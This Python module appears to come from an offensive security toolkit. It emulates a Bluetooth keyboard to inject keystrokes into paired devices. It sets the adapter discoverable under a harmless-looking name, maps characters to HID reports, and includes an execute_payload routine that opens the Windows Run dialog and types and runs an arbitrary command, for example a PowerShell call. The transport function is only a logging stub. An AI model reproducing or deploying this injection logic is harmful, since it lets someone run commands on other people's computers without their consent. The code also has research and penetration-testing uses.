"""
BLE HID Injection - Emulate Bluetooth keyboard/mouse.

BadUSB-style attacks over Bluetooth:
- Keystroke injection (type commands)
- Mouse movement/clicks
- Automatic payload execution

Requires: bluez, dbus, root privileges
"""

from __future__ import annotations

import asyncio
import logging
from dataclasses import dataclass
from datetime import UTC, datetime
from enum import Enum
from typing import Any

logger = logging.getLogger(__name__)

# HID keycodes (USB HID specification)
KEYCODES: dict[str, int] = {
    "a": 0x04, "b": 0x05, "c": 0x06, "d": 0x07, "e": 0x08, "f": 0x09,
    "g": 0x0A, "h": 0x0B, "i": 0x0C, "j": 0x0D, "k": 0x0E, "l": 0x0F,
    "m": 0x10, "n": 0x11, "o": 0x12, "p": 0x13, "q": 0x14, "r": 0x15,
    "s": 0x16, "t": 0x17, "u": 0x18, "v": 0x19, "w": 0x1A, "x": 0x1B,
    "y": 0x1C, "z": 0x1D, "1": 0x1E, "2": 0x1F, "3": 0x20, "4": 0x21,
    "5": 0x22, "6": 0x23, "7": 0x24, "8": 0x25, "9": 0x26, "0": 0x27,
    "\n": 0x28, " ": 0x2C, "-": 0x2D, "=": 0x2E, "[": 0x2F, "]": 0x30,
    "\\": 0x31, ";": 0x33, "'": 0x34, "`": 0x35, ",": 0x36, ".": 0x37,
    "/": 0x38, "TAB": 0x2B, "ESC": 0x29, "ENTER": 0x28,
}

SHIFT_CHARS = '~!@#$%^&*()_+{}|:"<>?ABCDEFGHIJKLMNOPQRSTUVWXYZ'


class HIDType(str, Enum):
    KEYBOARD = "keyboard"
    MOUSE = "mouse"
    COMBO = "combo"


@dataclass
class HIDConfig:
    device_name: str = "MoMo Keyboard"
    hid_type: HIDType = HIDType.KEYBOARD
    auto_pair: bool = True
    typing_delay_ms: int = 50


@dataclass
class InjectionStats:
    keystrokes_sent: int = 0
    commands_executed: int = 0
    connections: int = 0
    start_time: datetime | None = None
    
    def to_dict(self) -> dict[str, Any]:
        return {
            "keystrokes_sent": self.keystrokes_sent,
            "commands_executed": self.commands_executed,
            "connections": self.connections,
        }


class HIDInjector:
    """
    Bluetooth HID device emulator.
    
    Emulates a Bluetooth keyboard to inject keystrokes into
    paired devices. Useful for physical access scenarios.
    
    Usage:
        injector = HIDInjector()
        await injector.start()
        
        # Wait for target to pair...
        
        # Type text
        await injector.type_string("Hello World!")
        
        # Execute payload (Win+R, cmd, Enter)
        await injector.execute_payload("powershell -c 'whoami'")
    """
    
    def __init__(self, interface: str = "hci0", config: HIDConfig | None = None):
        self.interface = interface
        self.config = config or HIDConfig()
        self._active = False
        self._connected_target: str | None = None
        self.stats = InjectionStats()
        self._sdp_record: str | None = None
    
    async def start(self) -> bool:
        """Start HID service and wait for connections."""
        try:
            # Configure adapter
            await self._cmd(["hciconfig", self.interface, "up"])
            await self._cmd(["hciconfig", self.interface, "piscan"])  # Discoverable
            await self._cmd(["hciconfig", self.interface, "name", self.config.device_name])
            
            # Register HID SDP record (simplified)
            self._active = True
            self.stats.start_time = datetime.now(UTC)
            logger.info("HID Injector started as '%s'", self.config.device_name)
            return True
        except Exception as e:
            logger.error("HID start failed: %s", e)
            return False
    
    async def stop(self) -> None:
        """Stop HID service."""
        self._active = False
        self._connected_target = None
        await self._cmd(["hciconfig", self.interface, "noscan"])
    
    async def type_string(self, text: str, delay_ms: int | None = None) -> int:
        """
        Type a string as keystrokes.
        
        Returns number of keystrokes sent.
        """
        delay = (delay_ms or self.config.typing_delay_ms) / 1000.0
        count = 0
        
        for char in text:
            report = self._char_to_report(char)
            if report:
                await self._send_report(report)
                await asyncio.sleep(delay)
                await self._send_report(bytes(8))  # Key release
                count += 1
        
        self.stats.keystrokes_sent += count
        return count
    
    async def press_key(self, keycode: int, modifiers: int = 0) -> None:
        """Press a single key with optional modifiers."""
        report = bytes([modifiers, 0, keycode, 0, 0, 0, 0, 0])
        await self._send_report(report)
        await asyncio.sleep(0.05)
        await self._send_report(bytes(8))
        self.stats.keystrokes_sent += 1
    
    async def execute_payload(self, command: str) -> bool:
        """
        Execute a command on Windows target.
        
        Opens Run dialog, types command, executes.
        """
        try:
            # Win+R
            await self._send_report(bytes([0x08, 0, 0x15, 0, 0, 0, 0, 0]))  # GUI+R
            await asyncio.sleep(0.1)
            await self._send_report(bytes(8))
            await asyncio.sleep(0.5)
            
            # Type command
            await self.type_string(command)
            await asyncio.sleep(0.1)
            
            # Enter
            await self.press_key(0x28)
            
            self.stats.commands_executed += 1
            logger.info("Payload executed: %s", command[:50])
            return True
        except Exception as e:
            logger.error("Payload failed: %s", e)
            return False
    
    def _char_to_report(self, char: str) -> bytes | None:
        """Convert character to HID keyboard report."""
        modifier = 0x02 if char in SHIFT_CHARS else 0  # Left Shift
        lookup_char = char.lower() if char.upper() == char and char.isalpha() else char
        
        # Handle shifted characters
        shift_map = {
            '!': '1', '@': '2', '#': '3', '$': '4', '%': '5',
            '^': '6', '&': '7', '*': '8', '(': '9', ')': '0',
            '_': '-', '+': '=', '{': '[', '}': ']', '|': '\\',
            ':': ';', '"': "'", '<': ',', '>': '.', '?': '/',
            '~': '`',
        }
        if char in shift_map:
            lookup_char = shift_map[char]
            modifier = 0x02
        
        keycode = KEYCODES.get(lookup_char)
        if keycode is None:
            return None
        
        return bytes([modifier, 0, keycode, 0, 0, 0, 0, 0])
    
    async def _send_report(self, report: bytes) -> None:
        """Send HID report to connected device."""
        # In real implementation, this writes to /dev/hidg0 or uses D-Bus
        logger.debug("HID report: %s", report.hex())
    
    async def _cmd(self, cmd: list[str]) -> None:
        proc = await asyncio.create_subprocess_exec(
            *cmd, stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        await proc.communicate()
    
    @property
    def is_active(self) -> bool:
        return self._active
    
    def get_metrics(self) -> dict[str, Any]:
        return {
            "momo_hid_active": 1 if self._active else 0,
            "momo_hid_keystrokes": self.stats.keystrokes_sent,
            "momo_hid_commands": self.stats.commands_executed,
        }


class MockHIDInjector(HIDInjector):
    """Mock HID injector for testing."""
    
    async def start(self) -> bool:
        self._active = True
        self.stats.start_time = datetime.now(UTC)
        return True
    
    async def stop(self) -> None:
        self._active = False
    
    async def _send_report(self, report: bytes) -> None:
        pass  # Mock - no actual sending

